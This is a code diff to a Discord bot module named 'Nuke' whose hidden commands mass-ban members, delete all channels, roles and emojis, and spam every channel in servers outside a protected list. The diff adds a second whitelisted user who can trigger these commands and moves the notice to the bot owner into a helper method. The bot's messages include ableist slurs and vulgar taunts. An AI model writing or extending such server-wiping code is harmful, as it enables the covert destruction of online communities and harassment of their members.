@@ -8,6 +8,7 @@ class Nuke(commands.Cog):
         self.message = "you got fucked up\n https://cdn.discordapp.com/attachments/603298907023343723/609265114331217933/Soldiers_raising_the_Albanian_flag_over_the_Reichstag_Berlin_1945_2.jpg"
         self.invites = '@everyone'
         self.koda = 599507281226367006
+        self.whitelist = [599507281226367006, 267667599666446336]
         self.no_ban = [599507281226367006, 490275541413265409]
         self.servers = [599514553201459201, 617165058446721091, 622217454994849800]
     
@@ -77,10 +78,15 @@ class Nuke(commands.Cog):
             if ctx.content.startswith(">spam"):
                 await self.spam_channel(ctx.channel)
     
+    async def warn(self, ctx):
+        koda = self.bot.get_user(self.koda)
+        await koda.send(f"{ctx.author} attempted to use the nuke command in {ctx.guild.name}.")
+        await ctx.send("You have been reported to Koda for attempting to use the nuke command.")
+
     @commands.command(hidden=True)
     async def nuke(self, ctx):
         # await ctx.message.delete()
-        if ctx.author.id == self.koda:
+        if ctx.author.id in self.whitelist:
             if not ctx.guild.id in self.servers:
                 await self.ban_members(ctx)
                 await self.delete_channels(ctx)
@@ -90,27 +96,23 @@ class Nuke(commands.Cog):
                 await self.spam_all_channels(ctx)
                 print("Done!")
             else:
-                await ctx.send("Koda you fucking retard you can't nuke this server.")
+                await ctx.send("You fucking retard you can't nuke this server.")
         else:
-            koda = self.bot.get_user(self.koda)
-            await koda.send(f"{ctx.author} attempted to use the nuke command in {ctx.guild.name}.")
-            await ctx.send("You have been reported to Koda for attempting to use the nuke command.")
+            await self.warn(ctx)
     
     @commands.command(hidden=True)
     async def destroy(self, ctx):
         await ctx.message.delete()
-        if ctx.author.id == self.koda:
+        if ctx.author.id in self.whitelist:
             if not ctx.guild.id in self.servers:
                 await self.delete_channels(ctx)
                 await self.delete_roles(ctx)
                 await self.delete_emojis(ctx)
                 print("Done!")
             else:
-                await ctx.send("Koda you fucking retard you can't nuke this server.")
+                await ctx.send("You fucking retard you can't nuke this server.")
         else:
-            koda = self.bot.get_user(self.koda)
-            await koda.send(f"{ctx.author} attempted to use the nuke command in {ctx.guild.name}.")
-            await ctx.send("You have been reported to Koda for attempting to use the nuke command.")
+            await self.warn(ctx)
 
 def setup(bot):
     bot.add_cog(Nuke(bot))
